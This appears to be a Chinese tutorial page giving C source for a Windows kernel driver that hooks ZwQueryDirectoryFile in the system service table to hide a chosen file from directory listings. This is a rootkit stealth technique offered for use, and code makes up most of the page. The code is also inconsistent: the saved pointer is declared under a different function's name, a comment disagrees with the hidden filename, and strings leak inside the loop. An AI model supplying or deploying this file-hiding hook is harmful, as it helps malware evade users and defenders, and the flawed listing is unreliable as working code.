# Introduction #

> 目前NT下有很多种隐藏文件和目录的方法，其中最简单的一种是给文件和文件夹加上系统属性和隐藏属性，操作系统就会不在显示了，而且查找也找不到了，但是这种方法一点都不彻底，没有可用性！下面我们来介绍用NT驱动程序来拦截NTAPI来实现彻底隐藏文件和目录的目的。NT下有一个文件NTDLL.DLL，大部分NTAPI都是在这个库中封装的。其中实现查找文件和目录的API接口是ZwQueryDirectoryFile，所以我们只要拦截这个API的话，文件和目录就可以完全隐藏了！下面来一步不实现（准备工作：到NTDDK中找一个WDM驱动程序模型，也就是最简单的驱动程序了）：


# Details #

  1. 定义FILE\_INFORMATION\_CLASS的第3号结构：_FILE\_BOTH\_DIR\_INFORMATION，这个结构是ZwQueryDirectoryFile必须参数。
```
typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           FileIndex;
    LARGE_INTEGER   CreationTime;
    LARGE_INTEGER   LastAccessTime;
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;
    LARGE_INTEGER   AllocationSize;
    ULONG           FileAttributes;
    ULONG           FileNameLength;
    ULONG           EaSize;
    CCHAR           ShortNameLength;
    WCHAR           ShortName[12];
    WCHAR           FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

```_

2.先申明ZwQueryDirectoryFile，然后定义ZwQueryDirectoryFile的原型：

```
extern NTSYSAPI NTSTATUS NTAPI ZwQueryDirectoryFile(
             IN HANDLE hFile,
             IN HANDLE hEvent OPTIONAL,
             IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
             IN PVOID IoApcContext OPTIONAL,
             OUT PIO_STATUS_BLOCK pIoStatusBlock,
             OUT PVOID FileInformationBuffer,
             IN ULONG FileInformationBufferLength,
             IN FILE_INFORMATION_CLASS FileInfoClass,
             IN BOOLEAN bReturnOnlyOneEntry,
             IN PUNICODE_STRING PathMask OPTIONAL,
             IN BOOLEAN bRestartQuery);

//定义ZwQueryDirectoryFile的原型

typedef NTSTATUS (*REALZWQUERYDIRECTORYFILE)(IN HANDLE hFile,
            IN HANDLE hEvent OPTIONAL,
            IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
            IN PVOID IoApcContext OPTIONAL,
            OUT PIO_STATUS_BLOCK pIoStatusBlock,
            OUT PVOID FileInformationBuffer,
            IN ULONG FileInformationBufferLength,
            IN FILE_INFORMATION_CLASS FileInfoClass,
            IN BOOLEAN bReturnOnlyOneEntry,
            IN PUNICODE_STRING PathMask OPTIONAL,
            IN BOOLEAN bRestartQuery);

//定义一个原函数指针
REALZWQUERYSYSTEMINFORMATION RealZwQuerySystemInformation;
```

3.定义替换API函数的原型：

```
NTSTATUS HookZwQueryDirectoryFile( 
          IN HANDLE hFile,
          IN HANDLE hEvent OPTIONAL,
          IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
          IN PVOID IoApcContext OPTIONAL,
          OUT PIO_STATUS_BLOCK pIoStatusBlock,
          OUT PVOID FileInformationBuffer,
          IN ULONG FileInformationBufferLength,
          IN FILE_INFORMATION_CLASS FileInfoClass,
          IN BOOLEAN bReturnOnlyOneEntry,
          IN PUNICODE_STRING PathMask OPTIONAL,
          IN BOOLEAN bRestartQuery);
```
4.在DriverEntry（驱动入口）函数中加入如下申明：

```
//保存真正的ZwQueryDirectoryFile函数地址

RealZwQueryDirectoryFile=(REALZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile));

//把自定义的替换函数指针指向真正的ZwQueryDirectoryFile函数

(REALZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile))=HookZwQueryDirectoryFile;
```

5.在DriverUnload（驱动卸载函数）函数中加入恢复代码：

```
//恢复原来的函数指针

(REALZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile))=RealZwQueryDirectoryFile;
```

6.现在准备工作做好了，函数指针都已经设置转向了，剩下的是实现这个我们自定义的替换函数HookZwQueryDirectoryFile，代码如下：

```

NTSTATUS HookZwQueryDirectoryFile(
    IN HANDLE hFile,
    IN HANDLE hEvent OPTIONAL,
    IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
    IN PVOID IoApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK pIoStatusBlock,
    OUT PVOID FileInformationBuffer,
    IN ULONG FileInformationBufferLength,
    IN FILE_INFORMATION_CLASS FileInfoClass,
    IN BOOLEAN bReturnOnlyOneEntry,
    IN PUNICODE_STRING PathMask OPTIONAL,
    IN BOOLEAN bRestartQuery)
{
NTSTATUS rc;
ULONG CR0VALUE;

ANSI_STRING ansiFileName,ansiDirName,HideDirFile;
UNICODE_STRING uniFileName;

//初始化要过虑的文件名这里是debug.exe
RtlInitAnsiString(&HideDirFile,"DBGVIEW.EXE"); 

// 执行真正的ZwQueryDirectoryFile函数
rc = ((REALZWQUERYDIRECTORYFILE)(RealZwQueryDirectoryFile))(
  hFile, 
  hEvent,
  IoApcRoutine,
  IoApcContext,
  pIoStatusBlock,
  FileInformationBuffer,
  FileInformationBufferLength,
  FileInfoClass,
  bReturnOnlyOneEntry,
  PathMask,
  bRestartQuery);
   /*如果执行成功（而且FILE_INFORMATION_CLASS的值为FileBothDirectoryInformation，我们就进行处理，过滤*/
    if(NT_SUCCESS(rc)&& (FileInfoClass == FileBothDirectoryInformation))
{
  PFILE_BOTH_DIR_INFORMATION pFileInfo;
  PFILE_BOTH_DIR_INFORMATION pLastFileInfo;
  BOOL bLastOne;
  //把执行结果赋给pFileInfo 
  pFileInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer; 
  pLastFileInfo = NULL;
  //循环检查
  do
  {
   bLastOne = !( pFileInfo->NextEntryOffset );
   RtlInitUnicodeString(&uniFileName,pFileInfo->FileName);
   RtlUnicodeStringToAnsiString(&ansiFileName,&uniFileName,TRUE);
   RtlUnicodeStringToAnsiString(&ansiDirName,&uniFileName,TRUE);
   RtlUpperString(&ansiFileName,&ansiDirName);
   //打印结果，用debugview可以查看打印结果
   DbgPrint("ansiFileName :%s\n",ansiFileName.Buffer);
   DbgPrint("HideDirFile :%s\n",HideDirFile.Buffer);
   
   // 开始进行比较，如果找到了就隐藏这个文件或者目录
   if( RtlCompareMemory(ansiFileName.Buffer,HideDirFile.Buffer,HideDirFile.Length ) == HideDirFile.Length)
   {
    DbgPrint("This is HideDirFile!\n");
    if(bLastOne) 
    {
     if(pFileInfo == (PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer )
     {
      rc = 0x80000006; //隐藏文件或者目录；
     }
     else
     {
      pLastFileInfo->NextEntryOffset = 0;
     }
     break;
    } 
    else //指针往后移动
    {
     int iPos = ((ULONG)pFileInfo) - (ULONG)FileInformationBuffer;
     int iLeft = (DWORD)FileInformationBufferLength - iPos - pFileInfo->NextEntryOffset;
     RtlCopyMemory( (PVOID)pFileInfo, (PVOID)( (char *)pFileInfo + pFileInfo->NextEntryOffset ), (DWORD)iLeft );
     continue;
    }
   }
   pLastFileInfo = pFileInfo;
   pFileInfo = (PFILE_BOTH_DIR_INFORMATION)((char *)pFileInfo + pFileInfo->NextEntryOffset);
   
  }while(!bLastOne);
  RtlFreeAnsiString(&ansiDirName); 
  RtlFreeAnsiString(&ansiFileName);
}
return(rc);
}

```

本代码在开发机器（WINXP+SP1+XPDDK）上测试通过！